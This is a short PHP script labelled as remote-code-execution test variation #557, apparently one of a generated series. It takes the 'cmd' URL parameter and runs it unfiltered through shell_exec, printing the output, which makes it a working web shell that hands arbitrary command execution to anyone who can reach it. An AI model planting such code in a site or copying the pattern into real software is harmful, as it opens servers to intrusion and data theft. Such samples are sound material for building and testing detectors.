<?php
// RCE test variation #557
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>